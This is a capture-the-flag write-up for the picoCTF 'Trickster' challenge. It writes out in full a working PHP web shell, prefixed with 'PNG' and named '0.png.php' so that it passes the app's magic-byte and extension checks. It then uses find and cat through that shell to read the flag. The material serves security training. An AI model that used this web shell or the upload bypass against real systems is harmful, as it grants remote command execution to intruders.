# Trickster 
Description:I found a web app that can help process images: PNG images only!

### Solution:
first check **robots.txt** uisng http://atlas.picoctf.net:your_port/robots.txt
we have:
```
User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/
```

check the instructions.txt using http://atlas.picoctf.net:your_port/instructions.txt
you will get a paragraph:

    Let's create a web app for PNG Images processing.
    It needs to:
    Allow users to upload PNG images
        look for ".png" extension in the submitted files
        make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
    after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.

acoording to the paragraph, the file we uploaded may be save in /uploads/
so, we need to create a web shell that can remote the server and type command
here is the playload 
https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985
but we need to add PNG on the first line of the playload because of the paragraph above
```
PNG
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```
name the playload filenmae includes .png e.g. 0.png.php
Then upload the file on the page
now we can go to the file we uploaded http://atlas.picoctf.net:your_port/uploads/0.png.php

we can input the command on the page 
type find / -name "*.txt" to find the flag 
we can see there is a txt file name look like a base64 code 
guess it is a flag file 
and cat it using cat the path of the file
then we get the flag:))




